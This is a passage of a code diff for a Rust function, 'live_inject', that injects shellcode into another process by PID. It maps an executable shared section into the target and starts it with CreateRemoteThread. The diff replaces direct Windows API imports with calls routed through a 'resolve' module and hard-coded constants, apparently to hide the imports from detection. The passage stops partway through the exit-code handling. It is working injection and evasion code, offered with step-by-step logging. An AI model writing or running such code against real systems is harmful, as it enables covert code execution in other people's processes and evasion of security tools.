@@ -7,42 +7,47 @@ pub fn live_inject(
     shellcode: &[u8],
     log: &LogSink,
 ) -> Result<InjectionResult, String> {
-    use windows::Win32::Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE, WAIT_OBJECT_0};
-    use windows::Win32::System::Memory::{
-        CreateFileMappingW, MapViewOfFile, MapViewOfFileNuma2, UnmapViewOfFile,
-        FILE_MAP_WRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-    };
-    use windows::Win32::System::Threading::{
-        CreateRemoteThread, GetExitCodeThread, OpenProcess, WaitForSingleObject, INFINITE,
-        LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
-        PROCESS_VM_OPERATION, PROCESS_VM_READ,
-    };
+    use crate::resolve;
+    use std::ffi::c_void;
+
+    const PROCESS_CREATE_THREAD: u32 = 0x0002;
+    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+    const PROCESS_VM_OPERATION: u32 = 0x0008;
+    const PROCESS_VM_READ: u32 = 0x0010;
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+    const FILE_MAP_WRITE: u32 = 0x0002;
+    const INFINITE: u32 = 0xFFFFFFFF;
+    const WAIT_OBJECT_0: u32 = 0;
 
     let size = shellcode.len();
+    let invalid_handle = -1isize as *mut c_void;
 
     log.step("[1/6] CreateFileMappingW — anonymous shared section (PAGE_EXECUTE_READWRITE)");
     let section = unsafe {
-        CreateFileMappingW(
-            INVALID_HANDLE_VALUE,
-            None,
+        resolve::CreateFileMappingW(
+            invalid_handle,
+            std::ptr::null(),
             PAGE_EXECUTE_READWRITE,
             0,
             size as u32,
-            None,
+            std::ptr::null(),
         )
+    };
+    if section.is_null() {
+        return Err("CreateFileMappingW failed".to_string());
     }
-    .map_err(|e| format!("CreateFileMappingW failed: {e}"))?;
     log.info(format!("      section handle: {:?}", section));
 
     log.step("[2/6] MapViewOfFile — map section into local process (FILE_MAP_WRITE)");
-    let local_view = unsafe { MapViewOfFile(section, FILE_MAP_WRITE, 0, 0, size) };
-    if local_view.Value.is_null() {
-        let _ = unsafe { CloseHandle(section) };
+    let local_view = unsafe { resolve::MapViewOfFile(section, FILE_MAP_WRITE, 0, 0, size) };
+    if local_view.is_null() {
+        unsafe { resolve::CloseHandle(section) };
         return Err("MapViewOfFile returned NULL — local mapping failed".to_string());
     }
     log.info(format!(
         "      local view at {:#p} ({} bytes)",
-        local_view.Value, size
+        local_view, size
     ));
 
     log.step(format!(
@@ -50,13 +55,11 @@ pub fn live_inject(
         size
     ));
     unsafe {
-        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view.Value as *mut u8, size);
+        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, size);
     }
     log.info("      shellcode written to shared section via local mapping");
 
-    unsafe {
-        let _ = UnmapViewOfFile(local_view);
-    }
+    unsafe { resolve::UnmapViewOfFile(local_view as *const c_void) };
     log.detail("      local view unmapped");
 
     log.step(format!(
@@ -65,33 +68,34 @@ pub fn live_inject(
     ));
     let process_access =
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ;
-    let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
-        let _ = unsafe { CloseHandle(section) };
-        format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
-    })?;
+    let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
+    if process.is_null() {
+        unsafe { resolve::CloseHandle(section) };
+        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
+    }
 
     let remote_view = unsafe {
-        MapViewOfFileNuma2(
+        resolve::MapViewOfFileNuma2(
             section,
             process,
             0,
-            None,
+            std::ptr::null(),
             size,
             0,
-            PAGE_EXECUTE_READ.0,
+            PAGE_EXECUTE_READ,
             u32::MAX,
         )
     };
-    let _ = unsafe { CloseHandle(section) };
+    unsafe { resolve::CloseHandle(section) };
 
-    if remote_view.Value.is_null() {
-        let _ = unsafe { CloseHandle(process) };
+    if remote_view.is_null() {
+        unsafe { resolve::CloseHandle(process) };
         return Err(
             "MapViewOfFileNuma2 returned NULL — remote mapping failed (Windows 10 1703+ required)"
                 .to_string(),
         );
     }
-    let remote_base = remote_view.Value;
+    let remote_base = remote_view;
     log.info(format!(
         "      remote view at {:#p} ({} bytes, PAGE_EXECUTE_READ)",
         remote_base, size
@@ -102,50 +106,42 @@ pub fn live_inject(
         "[5/6] CreateRemoteThread — start at remote address {:#p}",
         remote_base
     ));
-    let start: LPTHREAD_START_ROUTINE = Some(unsafe {
-        core::mem::transmute::<
-            *mut core::ffi::c_void,
-            unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
-        >(remote_base)
-    });
     let mut thread_id: u32 = 0;
-    let thread = match unsafe {
-        CreateRemoteThread(
+    let thread = unsafe {
+        resolve::CreateRemoteThread(
             process,
-            None,
+            std::ptr::null(),
             0,
-            start,
-            Some(remote_base as *const core::ffi::c_void),
+            remote_base as *const c_void,
+            remote_base as *const c_void,
             0,
-            Some(&mut thread_id),
+            &mut thread_id,
         )
-    } {
-        Ok(h) => h,
-        Err(e) => {
-            let _ = unsafe { CloseHandle(process) };
-            return Err(format!("CreateRemoteThread failed: {e}"));
-        }
     };
+    if thread.is_null() {
+        unsafe { resolve::CloseHandle(process) };
+        return Err("CreateRemoteThread failed".to_string());
+    }
     log.info(format!("      remote thread started (TID {})", thread_id));
 
     log.step("[6/6] WaitForSingleObject — waiting for remote thread to finish");
-    let wait = unsafe { WaitForSingleObject(thread, INFINITE) };
+    let wait = unsafe { resolve::WaitForSingleObject(thread, INFINITE) };
     if wait != WAIT_OBJECT_0 {
-        let _ = unsafe { CloseHandle(thread) };
-        let _ = unsafe { CloseHandle(process) };
+        unsafe { resolve::CloseHandle(thread) };
+        unsafe { resolve::CloseHandle(process) };
         return Err(format!(
             "WaitForSingleObject returned {} (expected WAIT_OBJECT_0)",
-            wait.0
+            wait
         ));
     }
     let mut exit_code: u32 = 0;
-    if let Err(e) = unsafe { GetExitCodeThread(thread, &mut exit_code) } {
-        let _ = unsafe { CloseHandle(thread) };
-        let _ = unsafe { CloseHandle(process) };
-        return Err(format!("GetExitCodeThread failed: {e}"));
+    if unsafe { resolve::GetExitCodeThread(thread, &mut exit_code) } == 0 {
+        unsafe { resolve::CloseHandle(thread) };
+        unsafe { resolve::CloseHandle(process) };
+        return Err("GetExitCodeThread failed".to_string());
     }
-    let _ = unsafe { CloseHandle(thread) };
-    let _ = unsafe { CloseHandle(process) };
+    unsafe { resolve::CloseHandle(thread) };
+    unsafe { resolve::CloseHandle(process) };
 
     if exit_code == 0xC0000005 {
         log.error(format!(
